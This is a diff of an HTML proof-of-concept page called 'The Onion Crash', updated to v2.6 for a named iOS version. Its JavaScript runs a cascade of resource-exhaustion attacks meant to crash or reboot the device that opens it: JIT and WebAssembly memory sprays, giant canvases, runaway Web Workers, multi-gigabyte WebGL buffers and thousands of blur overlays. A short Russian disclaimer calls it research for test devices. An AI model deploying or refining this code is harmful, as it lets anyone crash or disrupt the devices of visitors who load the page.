@@ -3,16 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>The Onion Crash v2.5 — ULTIMATE REBOOT</title>
+    <title>The Onion Crash v2.6 — iOS 26.5 MAX</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
-        
-        :root {
-            --pink: #ff00ff;
-            --cyan: #00ffff;
-            --red: #ff0044;
-        }
-        
+        :root { --pink: #ff00ff; --cyan: #00ffff; --red: #ff0044; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             background: #0a000f;
@@ -25,98 +19,26 @@
             justify-content: center;
             position: relative;
         }
-        
-        .grid {
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(rgba(255,0,255,0.06) 1px, transparent 1px),
-                        linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px);
-            background-size: 35px 35px;
-            animation: gridMove 12s linear infinite;
-            z-index: 0;
-        }
+        .grid { position: absolute; inset: 0; background: linear-gradient(rgba(255,0,255,0.06) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px); background-size: 35px 35px; animation: gridMove 12s linear infinite; z-index: 0; }
         @keyframes gridMove { 0% {background-position:0 0} 100% {background-position:-140px -140px} }
-        
-        .scanline {
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(transparent 50%, rgba(255,20,80,0.15) 50%);
-            background-size: 100% 5px;
-            animation: scan 2.8s linear infinite;
-            z-index: 1;
-        }
+        .scanline { position: absolute; inset: 0; background: linear-gradient(transparent 50%, rgba(255,20,80,0.15) 50%); background-size: 100% 5px; animation: scan 2.8s linear infinite; z-index: 1; }
         @keyframes scan { 0%{transform:translateY(-180%)} 100%{transform:translateY(450%)} }
-        
         .container {
-            position: relative;
-            z-index: 2;
-            width: 94%;
-            max-width: 780px;
-            background: rgba(15,0,35,0.97);
-            border: 6px solid var(--pink);
-            box-shadow: 0 0 80px var(--pink), 0 0 40px var(--red);
-            padding: 45px 30px;
-            border-radius: 20px;
+            position: relative; z-index: 2; width: 94%; max-width: 780px;
+            background: rgba(15,0,35,0.97); border: 6px solid var(--pink);
+            box-shadow: 0 0 80px var(--pink); padding: 45px 30px; border-radius: 20px;
         }
-        
-        h1 {
-            font-size: 2.85em;
-            color: var(--pink);
-            text-shadow: 0 0 30px var(--pink), 0 0 50px var(--red);
-            animation: flicker 0.55s infinite alternate;
-        }
+        h1 { font-size: 2.85em; color: var(--pink); text-shadow: 0 0 30px var(--pink); animation: flicker 0.55s infinite alternate; }
         @keyframes flicker { 0% {opacity:0.75} 100% {opacity:1} }
-        
-        .subtitle { color: #ff0088; margin: 12px 0 35px; font-size: 1.25em; }
-        
-        .warning {
-            background: rgba(160,0,0,0.5);
-            border: 5px solid #ff2222;
-            padding: 25px;
-            margin: 30px 0;
-            color: #ffdddd;
-            border-radius: 12px;
-            font-size: 0.95em;
-        }
-        
         button {
-            font-family: 'Press Start 2P', system-ui;
-            padding: 26px 70px;
-            font-size: 1.5em;
-            background: transparent;
-            color: #00ff99;
-            border: 6px solid #00ff99;
-            cursor: pointer;
-            box-shadow: 0 0 50px #00ff99;
-            transition: all 0.4s;
-            text-transform: uppercase;
-            display: block;
-            margin: 30px auto;
+            font-family: 'Press Start 2P', system-ui; padding: 26px 70px; font-size: 1.5em;
+            background: transparent; color: #00ff99; border: 6px solid #00ff99;
+            cursor: pointer; box-shadow: 0 0 50px #00ff99; transition: all 0.4s;
+            display: block; margin: 30px auto;
         }
         button:hover { background:#00ff99; color:#000; transform:scale(1.12); }
-        button:disabled { opacity:0.35; cursor:not-allowed; }
-        
-        #progress, #status {
-            margin: 30px 0;
-            padding: 20px;
-            background: #000000dd;
-            border: 3px solid var(--cyan);
-            font-size: 0.96em;
-            text-align: left;
-            display: none;
-        }
+        #progress, #status { margin: 30px 0; padding: 20px; background: #000000dd; border: 3px solid var(--cyan); font-size: 0.96em; text-align: left; display: none; }
         #status { height: 230px; overflow-y: auto; }
-        
-        .history { margin-top: 45px; }
-        .history h3 { color: var(--pink); margin-bottom: 15px; }
-        .entry {
-            background: rgba(30,0,50,0.85);
-            padding: 14px;
-            margin: 10px 0;
-            border-left: 7px solid #00ff88;
-            font-size: 0.86em;
-        }
-        .crashed { border-left-color: #ff3366; }
     </style>
 </head>
 <body>
@@ -124,140 +46,102 @@
     <div class="scanline"></div>
     
     <div class="container">
-        <h1>🧅 THE ONION CRASH</h1>
-        <div class="subtitle">v2.5 — ULTIMATE REBOOT PoC</div>
+        <h1>🧅 THE ONION CRASH v2.6</h1>
+        <p style="color:#ff0088; text-align:center; margin:15px 0 30px;">iOS 26.5 MAX REBOOT PoC</p>
         
-        <div class="warning">
-            <strong>⚠️ STRICTLY EDUCATIONAL RESEARCH ONLY</strong><br>
-            Только тестовые устройства. Не используй на основном iPhone.<br>
-            Цель — максимальная нагрузка на GPU / память / WebKit для демонстрации.
+        <div style="background:rgba(160,0,0,0.5); border:5px solid #ff2222; padding:25px; margin:30px 0; color:#ffdddd; border-radius:12px;">
+            <strong>⚠️ RESEARCH ONLY — iOS 26.5</strong><br>
+            Только тестовое устройство. Может вызвать jetsam / respring / reboot.<br>
+            Если стабильно ребутит — можно пробовать в Bug Bounty.
         </div>
         
-        <button id="runBtn">▶ LAUNCH ULTIMATE REBOOT CASCADE</button>
+        <button id="runBtn">▶ LAUNCH ULTIMATE 26.5 CASCADE</button>
         
         <div id="confirm" style="display:none; margin:30px 0; text-align:center;">
-            <p style="color:#ff5555; font-size:1.25em;">ЭТО МОЖЕТ ВЫЗВАТЬ ПОЛНЫЙ РЕБУТ УСТРОЙСТВА!<br>Ты уверен?</p>
-            <button id="confirmYes" style="background:#550000; color:white; border:5px solid #ff4444; padding:20px 55px;">ДА, ЗАПУСКАЙ МАКСИМУМ</button>
+            <p style="color:#ff5555; font-size:1.25em;">МОЖЕТ ВЫЗВАТЬ ПОЛНЫЙ РЕБУТ!<br>Продолжить?</p>
+            <button id="confirmYes" style="background:#550000; color:white; border:5px solid #ff4444; padding:20px 55px;">ДА, ЗАПУСКАЙ</button>
         </div>
         
         <div id="progress"></div>
         <div id="status"></div>
         
-        <div class="history">
-            <h3>📜 ИСТОРИЯ</h3>
+        <div class="history" style="margin-top:45px;">
+            <h3 style="color:var(--pink);">📜 ИСТОРИЯ</h3>
             <div id="historyList"></div>
         </div>
     </div>
 
     <script>
         const LAYERS = [
-            // LOW — подготовка
-            ...Array.from({length: 7}, (_,i) => ({
-                group: "LOW", name: `JIT Memory Spray ${i+1}`, prob: "low",
-                fn: async () => {
-                    for(let j=0; j<600; j++) try { new Function('x', `return x*${Math.random()}`)(); } catch(e){}
-                    try { new WebAssembly.Memory({initial: 65536}); } catch(e){}
-                }
+            // LOW - JIT / WASM
+            ...Array.from({length:8}, (_,i) => ({group:"LOW", name:`JIT Spray ${i+1}`, prob:"low",
+                fn: async () => { for(let j=0;j<700;j++) try{new Function('x',`return x*${Math.random()}`)();}catch(e){} try{new WebAssembly.Memory({initial:65536});}catch(e){} }
             })),
 
-            // MEDIUM — разогрев
-            {group:"MEDIUM", name:"Audio + Canvas Flood", prob:"med", fn:async()=>{
+            // MEDIUM
+            {group:"MEDIUM", name:"AudioContext + Large Canvas", prob:"med", fn:async()=>{
                 const ctx = new (window.AudioContext||window.webkitAudioContext)();
-                for(let i=0;i<400;i++) try{ const o=ctx.createOscillator(); o.connect(ctx.destination); o.start(); }catch(e){}
-                
-                const c = document.createElement('canvas');
-                c.width = c.height = 20480;
+                for(let i=0;i<450;i++) try{const o=ctx.createOscillator();o.connect(ctx.destination);o.start();}catch(e){}
+                const c=document.createElement('canvas'); c.width=c.height=24576;
+                try{const gl=c.getContext('2d');gl.fillRect(0,0,c.width,c.height);for(let k=0;k<3;k++)c.toDataURL();}catch(e){}
+            }},
+
+            // HIGH - максимум для 26.5
+            {group:"HIGH", name:"EXTREME Memory + Canvas Bomb", prob:"high", fn:async()=>{
                 try {
-                    const gl = c.getContext('2d');
-                    gl.fillRect(0,0,c.width,c.height);
-                    c.toDataURL();
+                    for(let i=0; i<6; i++) {
+                        const c = document.createElement('canvas');
+                        c.width = 32768; c.height = 24576;
+                        const ctx = c.getContext('2d', {alpha:false, desynchronized:true});
+                        ctx.fillStyle = '#00ffff';
+                        ctx.fillRect(0,0,c.width,c.height);
+                    }
                 } catch(e){}
             }},
 
-            {group:"MEDIUM", name:"Worker + Blur Warmup", prob:"med", fn:async()=>{
-                for(let i=0;i<30;i++) try{ new Worker(URL.createObjectURL(new Blob(['while(true){}']))) }catch(e){}
-            }},
-
-            // HIGH — УЛЬТРА ТЯЖЁЛЫЕ СЛОИ (цель — полный ребут)
-            {group:"HIGH", name:"ULTIMATE Backdrop Pressure", prob:"high", fn:async()=>{
-                // Ещё более агрессивный backdrop (много слоёв с разными параметрами)
-                for(let i = 0; i < 5200; i++) {
-                    const d = document.createElement('div');
-                    const blur = 150 + (i % 220);
-                    d.style.cssText = `position:fixed; inset:0; backdrop-filter:blur(${blur}px); opacity:0.26; mix-blend-mode:screen; z-index:999999; pointer-events:none;`;
-                    document.body.appendChild(d);
-                    if (i % 350 === 0) await new Promise(r => setTimeout(r, 20));
-                }
-            }},
-
-            {group:"HIGH", name:"Monster Canvas Battery", prob:"high", fn:async()=>{
-                try {
-                    for(let i = 0; i < 5; i++) {
-                        const c = document.createElement('canvas');
-                        c.width = 32768;
-                        c.height = 24576;
-                        const ctx = c.getContext('2d', {alpha: false});
-                        ctx.fillStyle = '#0f0';
-                        ctx.fillRect(0, 0, c.width, c.height);
-                    }
-                } catch(e) {}
-            }},
-
-            {group:"HIGH", name:"Insane Worker Swarm", prob:"high", fn:async()=>{
-                for(let i = 0; i < 72; i++) {
+            {group:"HIGH", name:"Insane Worker + ArrayBuffer Swarm", prob:"high", fn:async()=>{
+                for(let i=0; i<80; i++) {
                     try {
-                        const blob = new Blob([`
-                            onmessage = () => {
-                                while(true) {
-                                    new ArrayBuffer(1024*1024*48);
-                                    let x = new Array(5000000).fill(0).map((_,i)=>i*i);
-                                }
-                            };
-                            postMessage('start');
-                        `]);
-                        const w = new Worker(URL.createObjectURL(blob));
-                        w.postMessage('go');
+                        const blob = new Blob([`while(true){ new ArrayBuffer(1024*1024*64); let a = new Array(8000000).fill(0).map((_,k)=>k*k); }`]);
+                        new Worker(URL.createObjectURL(blob));
                     } catch(e){}
                 }
             }},
 
-            {group:"HIGH", name:"WebGL + GPU Hell", prob:"high", fn:async()=>{
-                const canv = document.createElement('canvas');
-                const gl = canv.getContext('webgl2') || canv.getContext('webgl');
+            {group:"HIGH", name:"WebGL Texture + Buffer Pressure", prob:"high", fn:async()=>{
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl2') || c.getContext('webgl');
                 if(gl) {
                     try {
-                        for(let i=0; i<8; i++) {
+                        for(let i=0; i<12; i++) {
                             const buf = gl.createBuffer();
                             gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                            gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*1200, gl.STATIC_DRAW);
+                            gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*1400, gl.STATIC_DRAW);
                         }
                     } catch(e){}
                 }
             }},
 
-            {group:"HIGH", name:"FINAL ULTIMATE COMBO", prob:"high", fn:async()=>{
-                // Последний удар — задержка + память
-                try { new ArrayBuffer(1024*1024*512); } catch(e){}
-                await new Promise(r => setTimeout(r, 3500));
+            {group:"HIGH", name:"FINAL 26.5 COMBO", prob:"high", fn:async()=>{
+                try { new ArrayBuffer(1024*1024*600); } catch(e){}
+                await new Promise(r => setTimeout(r, 4200));
             }},
 
-            // Дополнительные ультра-слои
-            ...Array.from({length: 32}, (_,i) => ({
-                group: "HIGH", 
-                name: `Nuclear Layer ${i+1}`, 
-                prob: "high",
+            ...Array.from({length: 35}, (_,i) => ({
+                group: "HIGH", name: `Deep Pressure Layer ${i+1}`, prob: "high",
                 fn: async () => {
                     try {
-                        new ArrayBuffer(1024*1024*160);
+                        new ArrayBuffer(1024*1024*180);
                         const d = document.createElement('div');
-                        d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(220px);opacity:0.32;z-index:999999;pointer-events:none;`;
+                        d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(240px);opacity:0.25;z-index:999999;pointer-events:none;`;
                         document.body.appendChild(d);
                     } catch(e){}
-                    await new Promise(r => setTimeout(r, 110));
+                    await new Promise(r => setTimeout(r, 130));
                 }
             }))
         ];
 
+        // Остальной код (session, detect, run, etc.) — такой же как в v2.5
         let currentSession = null;
         let isRunning = false;
 
@@ -283,6 +167,7 @@
             JSON.parse(localStorage.getItem('onionHistory') || '[]').slice(0,6).forEach(s => {
                 const div = document.createElement('div');
                 div.className = `entry ${s.status==='crashed'?'crashed':''}`;
+                div.style = "background:rgba(30,0,50,0.85);padding:14px;margin:10px 0;border-left:7px solid #00ff88;font-size:0.86em;";
                 const crash = s.layers.find(l => l.status==='crashed');
                 div.innerHTML = `${s.start.slice(11,19)} — <b>${s.status}</b>${crash ? `<br>💀 ${crash.name}` : ''}`;
                 list.appendChild(div);
@@ -294,13 +179,10 @@
             const stat = document.getElementById('status');
             prog.style.display = 'block';
             stat.style.display = 'block';
-            
             prog.textContent = `[${idx+1}/${LAYERS.length}] ${layer.group} | ${layer.name}`;
-            stat.innerHTML += `<br>→ ${layer.name} <span style="color:#ff0">(max pressure)</span>`;
-            
+            stat.innerHTML += `<br>→ ${layer.name} ...`;
             currentSession.layers[idx].status = 'running';
             saveSession();
-            
             try {
                 await layer.fn();
                 currentSession.layers[idx].status = 'completed';
@@ -310,32 +192,23 @@
                 stat.innerHTML += ` <span style="color:#f80">ERR</span>`;
             }
             saveSession();
-            await new Promise(r => setTimeout(r, 60));
+            await new Promise(r => setTimeout(r, 70));
         }
 
         async function startExploit() {
             if (isRunning) return;
             isRunning = true;
             document.getElementById('runBtn').disabled = true;
-            
-            currentSession = {
-                id: Date.now(),
-                start: new Date().toISOString(),
-                status: 'running',
-                layers: LAYERS.map(l => ({name: l.name, status: 'pending'}))
-            };
+            currentSession = { id: Date.now(), start: new Date().toISOString(), status: 'running', layers: LAYERS.map(l => ({name: l.name, status: 'pending'})) };
             saveSession();
-            
-            document.getElementById('status').innerHTML = '☢️ ULTIMATE REBOOT CASCADE INITIATED...';
-            
+            document.getElementById('status').innerHTML = '☢️ iOS 26.5 MAX CASCADE STARTED...';
             for (let i = 0; i < LAYERS.length; i++) {
                 if (!isRunning) break;
                 await runLayer(LAYERS[i], i);
             }
-            
             currentSession.status = 'completed';
             saveSession();
-            document.getElementById('status').innerHTML += '<br><span style="color:#0ff">FINISHED (device survived this attempt)</span>';
+            document.getElementById('status').innerHTML += '<br><span style="color:#0ff">FINISHED</span>';
             isRunning = false;
             document.getElementById('runBtn').disabled = false;
         }
@@ -343,12 +216,8 @@
         window.onload = () => {
             detectPreviousCrash();
             renderHistory();
-            
             document.getElementById('runBtn').onclick = () => document.getElementById('confirm').style.display = 'block';
-            document.getElementById('confirmYes').onclick = () => {
-                document.getElementById('confirm').style.display = 'none';
-                startExploit();
-            };
+            document.getElementById('confirmYes').onclick = () => { document.getElementById('confirm').style.display = 'none'; startExploit(); };
         };
     </script>
 </body>
